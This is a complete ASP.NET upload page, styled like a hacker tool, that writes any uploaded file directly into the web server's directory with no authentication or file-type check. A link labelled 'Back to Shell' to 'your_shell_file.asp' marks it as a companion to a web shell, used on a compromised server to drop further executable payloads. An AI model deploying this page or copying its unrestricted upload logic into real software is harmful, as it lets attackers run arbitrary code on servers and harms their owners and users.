<%@ Page Language="C#" Debug="true" %>
<html>
<head>
    <title>Uploader</title>
    <style>
        body {font-family:monospace; background:#112; color:#0f0; padding:20px;}
        .status {font-size:16px; padding:10px; background:#222;}
    </style>
</head>
<body>
    <h2>ASP.NET File Uploader</h2>
    
    <form method="post" enctype="multipart/form-data" runat="server">
        <asp:FileUpload ID="File1" runat="server" />
        <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />
        <br><br>
        <div class="status">
            <asp:Label ID="lblResult" runat="server" />
        </div>
    </form>

    <script runat="server">
        protected void btnUpload_Click(object sender, EventArgs e)
        {
            if (File1.HasFile)
            {
                try
                {
                    string filename = System.IO.Path.GetFileName(File1.FileName);
                    string path = Server.MapPath("./") + filename;
                    
                    File1.SaveAs(path);
                    lblResult.Text = "✅ SUCCESS! File uploaded: <b>" + filename + "</b>";
                    lblResult.ForeColor = System.Drawing.Color.Lime;
                }
                catch (Exception ex)
                {
                    lblResult.Text = "❌ ERROR: " + ex.Message;
                    lblResult.ForeColor = System.Drawing.Color.Red;
                }
            }
            else
            {
                lblResult.Text = "Please choose a file.";
            }
        }
    </script>
    
    <hr>
    <a href="your_shell_file.asp">← Back to Shell</a>
</body>
</html>
